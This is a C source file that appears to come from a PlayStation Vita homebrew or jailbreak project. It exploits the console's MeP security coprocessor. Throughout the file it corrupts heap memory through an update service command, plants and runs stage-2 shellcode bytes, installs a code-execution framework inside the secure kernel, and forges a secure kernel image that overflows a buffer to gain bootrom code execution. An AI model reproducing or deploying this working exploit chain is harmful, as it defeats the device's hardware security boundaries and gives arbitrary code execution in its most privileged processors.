/*
 * Copyright (C) 2021 skgleba
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */
#include "cmep.h"
#include "cmep-payloads/spl-defs.h"
#include "sk.h" // legit secure_kernel.enp header
#include "cmep-payloads/sk_framework/sk_framework.h" // tiny secure_kernel framework
#include "cmep-payloads/sk_install_framework/inject_framework.h" // payload to install the above in secure_kernel
#include "cmep-payloads/brom_framework/brom_framework.h" // tiny bootrom framework
#include "cmep-payloads/bromcpy/bromcpy.h" // cmep bootrom memcpy

// run code @ 0x1f850100 and jump back to 0xd0002::sw6
static const unsigned char nmp_stage2[] =
{
    0x21, 0xc0, 0x85, 0x1f,	// movh r0, 0x1f85
    0x04, 0xc0, 0x00, 0x01,	// or3 r0, r0, 0x100
    0x0f, 0x10,				// jsr r0
    0x21, 0xc0, 0x00, 0x00,	// movh r0, 0x0
    0x50, 0xd3, 0xbd, 0x80,	// movu r3, 0x80bd50
    0x3e, 0x10				// jmp r3
};

// [@0x00040300] fake sk load success, loop code @ 0x00040310
static const unsigned char brom_stage2[] = {
  0x21, 0xc0, 0x00, 0xe0,   // movh r0, 0xe000
  0x01, 0x51,               // mov r1, 0x1
  0x0a, 0x01,               // sw r1, (r0)
  0x01, 0xc1, 0xaa, 0x00,   // mov r1, 0xaa
  0x05, 0xb0,               // bsr 0x00040310
  0xfa, 0xbf                // bra 0x00040308
};

// hack cmep and install a code-exec framework in secure_kernel
static int cmep_init(int a0, int a1) {
    k_root* kroot = &g_kroot;
    // get funcs
    int (*start_sm)(int priority, const char* sm, int unk2, int unk3, int unk4, int unk5, SceSblSmCommContext130 * commctx, int* smctx) = KFUN("SceSblSsSmComm", 0x6dc | 1);
    int (*call_sm)(int smctx, int cmd, int* smret, void* argva, uint32_t argsz) = KFUN("SceSblSsSmComm", 0x190 | 1);
    int (*stop_sm)(int smctx, uint32_t * ret8) = KFUN("SceSblSsSmComm", 0x7e4 | 1);

    if (!kroot || !start_sm || !call_sm || !stop_sm)
        return -1;

    kroot->printf("[SNS][FUD] hello from cmep_install_spl, loading update_sm\n");

    // laod update_service_sm
    int ctx = -1;
    SceSblSmCommContext130 smcomm_ctx;
    kroot->memset(&smcomm_ctx, 0, sizeof(smcomm_ctx));
    kroot->memcpy(smcomm_ctx.data0, ctx_130_data, 0x90);
    smcomm_ctx.pathId = 2;
    smcomm_ctx.self_type = (smcomm_ctx.self_type & 0xFFFFFFF0) | 2;
    int ret = start_sm(0, "os0:sm/update_service_sm.self", 0, 0, 0, 0, &smcomm_ctx, &ctx);
    if (ret < 0)
        return ret;

    // convert service 0xd0002
    kroot->printf("[SNS][FUD] converting 0xd0002\n");
    kroot->memset(kroot->pac_dram, 0, 0x1000);
    cmd_0x50002_t* cargs = kroot->pac_dram;
    cargs->use_lv2_mode_0 = cargs->use_lv2_mode_1 = 0;
    cargs->list_count = 3;
    cargs->total_count = 1;
    cargs->list.lv1[0].addr = cargs->list.lv1[1].addr = (void*)0x50000000;
    cargs->list.lv1[0].length = cargs->list.lv1[1].length = 0x10;
    cargs->list.lv1[2].addr = 0;
    cargs->list.lv1[2].length = 0x0080bd40 - offsetof(heap_hdr_t, next);
    int sm_ret = -1;
    ret = call_sm(ctx, 0x50002, &sm_ret, cargs, sizeof(cmd_0x50002_t));
    kroot->printf("[SNS][FUD] corrupt32: 0x%X | 0x%X\n", ret, sm_ret);

    // plant stage2 paddr in sm buffer
    kroot->printf("[SNS][FUD] planting stage2 paddr\n");
    sm_ret = -1;
    uint32_t jmpbuf[16];
    jmpbuf[0] = 1;
    jmpbuf[1] = 1;
    jmpbuf[2] = 0x1f850000;
    jmpbuf[3] = 0x1f850000;
    jmpbuf[4] = 0x1f850000;
    ret = call_sm(ctx, 0xd0002, &sm_ret, jmpbuf, 64);
    kroot->printf("[SNS][FUD] plant: 0x%X | 0x%X\n", ret, sm_ret);

    // copy stage2 and custom code to 0x1f850000
    kroot->printf("[SNS][FUD] copying the custom code\n");
    kroot->memset(kroot->venezia_spram, 0, 0x300);
    kroot->memcpy(kroot->venezia_spram, nmp_stage2, sizeof(nmp_stage2));
    kroot->memcpy((kroot->venezia_spram + 0x100), inject_framework_nmp, sizeof(inject_framework_nmp));
    kroot->memcpy((kroot->venezia_spram + 0x200), sk_framework_nmp, sizeof(sk_framework_nmp));

    // run stage2
    kroot->printf("[SNS][FUD] running the custom code\n");
    sm_ret = -1;
    jmpbuf[0] = 5042;
    ret = call_sm(ctx, 0xd0002, &sm_ret, jmpbuf, 64);
    kroot->printf("[SNS][FUD] run: 0x%X | 0x%X\n", ret, sm_ret);
    if (ret)
        return -2;

    // unload the sm
    kroot->printf("[SNS][FUD] all done, stopping sm\n");
    jmpbuf[0] = 0;
    jmpbuf[1] = 0;
    return stop_sm(ctx, jmpbuf);
}

// run custom cmep code using the secure_kernel framework
static int cmep_run(k_root* kroot, void* code, uint32_t size, uint32_t arg) {
    if (!kroot || !code)
        return -1;

    kroot->printf("[SNS][FUD] cmep_run_code, preparing commem\n");

    fm_nfo* fmnfo = kroot->venezia_spram;
    kroot->memset(fmnfo, 0, sizeof(fm_nfo));

    if (size) {
        kroot->printf("[SNS][FUD] copying code to venezia spram\n");
        kroot->memset(kroot->venezia_spram + 0x20, 0, 0x300);
        kroot->memcpy(kroot->venezia_spram + 0x20, code, size);
        fmnfo->codepaddr = 0x1f850020;
    } else
        fmnfo->codepaddr = (uint32_t)code;

    fmnfo->magic = 0x14ff;
    fmnfo->arg = arg;
    
    kroot->printf("[SNS][FUD] running custom cmep code\n");
    __asm ("dmb sy");
    __asm ("dsb sy");
    fmnfo->status = 0x34;
    int ret = xsmc(0, 0, 0, 0, 0x13c);
    __asm ("dsb sy");
    __asm ("dmb sy");

    kroot->printf("[SNS][FUD] smc 0x%X | status 0x%X | resp 0x%X\n", ret, fmnfo->status, fmnfo->resp);

    return (fmnfo->status == 0x69) ? (int)fmnfo->resp : -2;
}

// construct the fake secure_kernel.enp @ 0x4c000000
static int brom_init(k_root* kroot) {
    if (!kroot)
        return -1;
    
    kroot->printf("[SNS][FUD] brom_init, cleaning tachyon eDRAM and pac DRAM\n");
    kroot->memset(kroot->tachyon_edram, 0, 0x200000);
    kroot->memset(kroot->pac_dram, 0, 0x20000);

    kroot->printf("[SNS][FUD] preparing the fake sk\n");
    // legit sk header and the bootrom payloads
    kroot->memcpy(kroot->pac_dram, secure_kernel_enp, 0x40);
    kroot->memcpy(kroot->pac_dram + 0x300, brom_stage2, 0x10);
    kroot->memcpy(kroot->pac_dram + 0x310, brom_framework_nmp, sizeof(brom_framework_nmp));
    kroot->memcpy(kroot->pac_dram + 0x3E0, "hellowo from cmep first_loader\n", sizeof("hellowo from cmep first_loader\n"));
    // buffer overflow
    *(uint32_t*)(kroot->pac_dram + 4) = 0x2c0;
    *(uint32_t*)(kroot->pac_dram + 0x10) = -0x2c0;
    // bra slide-back
    for (int skoff = 0x400; skoff < (0x20000 - 4); skoff -= -4) {
        *(uint32_t*)(kroot->pac_dram + skoff) = 0xbffebffe;
    }
    // bra brom_payload
    *(uint16_t*)(kroot->pac_dram + 0x400) = 0xbf00;

    return 0;
}

// run code using the cmep bootrom framework
static int brom_run(k_root* kroot, void* code, uint32_t size, uint32_t arg, int wellcheck) {
    if (!kroot || !code)
        return -1;

    void (*wait)() = (void*)KFUN("SceKernelThreadMgr", 0x2fc8 | 1);

    kroot->printf("[SNS][FUD] brom_run_code(0x%X(0x%X) [0x%X])\n", code, arg, size);

    kroot->printf("[SNS][FUD] pacDRAM = 0x%X 0x%X 0x%X 0x%X\n", *(uint32_t*)kroot->pac_dram, *(uint32_t*)(kroot->pac_dram + 4), *(uint32_t*)(kroot->pac_dram + 8), *(uint32_t*)(kroot->pac_dram + 0xC));
    if (*(uint32_t*)kroot->pac_dram != 0xF00DF00D) {
        kroot->printf("[SNS][FUD] brom not ready - aborting\n");
        return -3;
    }
    
    volatile fm_nfo* fmnfo = kroot->tachyon_edram;
    kroot->memset((void*)fmnfo, 0, sizeof(fm_nfo));

    if (size) {
        kroot->printf("[SNS][FUD] copying code to tachyon edram\n");
        kroot->memset(kroot->tachyon_edram + 0x20, 0, 0x300);
        kroot->memcpy(kroot->tachyon_edram + 0x20, code, size);
        fmnfo->codepaddr = 0x1C000020;
    } else
        fmnfo->codepaddr = (uint32_t)code;

    fmnfo->magic = 0x14ff;
    fmnfo->arg = arg;

    kroot->printf("[SNS][FUD] running custom brom code\n");
    __asm ("dmb sy");
    __asm ("dsb sy");
    fmnfo->status = 0x34;
    __asm ("dsb sy");
    __asm ("dmb sy");

    while (fmnfo->status != 0xAA) {
        if (wellcheck) {
            kroot->printf("[SNS][FUD] reg0 0x%08X | reg1 0x%08X\n", *(uint32_t*)(kroot->tachyon_edram + 0x10), *(uint32_t*)(kroot->tachyon_edram + 0x14));
            wait(wellcheck);
        }
    }

    kroot->printf("[SNS][FUD] status 0x%X | resp 0x%X\n", fmnfo->status, fmnfo->resp);

    return (fmnfo->status == 0xAA) ? (int)fmnfo->resp : -2;
}

// PA memcpy using the brom framework
static int bromcpy(uint32_t dst, uint32_t src, uint32_t size, k_root* kroot) {
    if (!kroot)
        return -1;

    kroot->printf("[SNS][FUD] bromcpy 0x%X @ 0x%X -> 0x%X\n", size, src, dst);

    kroot->memset(kroot->pac_dram + 0x10, 0, 0x20000 - 0x10);

    bromcpy_args* args = kroot->pac_dram + 0x10;
    args->magic = 0xF00DF00D;
    args->src = src;
    args->dst = dst;
    args->sz = size;

    uint32_t ret = brom_run(kroot, (void*)bromcpy_nmp, sizeof(bromcpy_nmp), 0x4C000010, 0);
    kroot->printf("[SNS][FUD] brom_run ret 0x%X\n", ret);
    if ((uint32_t)ret != 0xF00D600D)
        return -2;
    
    return 0;
}

// copy 3.65 second_loader to cmep memory using bootrom code exec framework
static int apply_fakeenv(void* sl, void* evh, uint32_t evh_size, k_root* kroot) {
    if (!kroot || !evh)
        return -1;

    kroot->printf("[SNS][FUD] apply_fakeenv (0x%X)\n", 0xCE00);
    kroot->memset(kroot->tachyon_edram + 0x20000, 0, 0xCE00);
    kroot->memcpy(kroot->tachyon_edram + 0x20000, sl, 0xCE00);
    
    kroot->printf("[SNS][FUD] preparing the evectors table and handler\n");
    for (int i = 0; i < 0xb0; i -= -4) {
        *(uint32_t*)(kroot->tachyon_edram + 0x20000 + i) = 0x0400dd88;
    }
    kroot->memcpy(kroot->tachyon_edram + 0x200b0, evh, evh_size);

    kroot->printf("[SNS][FUD] copying preframe\n");
    int ret = bromcpy(0x00040000, 0x1C020000, 0x300, kroot);
    if (ret)
        return ret;
    
    kroot->printf("[SNS][FUD] copying postframe\n");
    ret = bromcpy(0x00040400, 0x1C020000 + 0x400, 0xCE00 - 0x400, kroot);
    if (ret)
        return ret;

    return 0;
}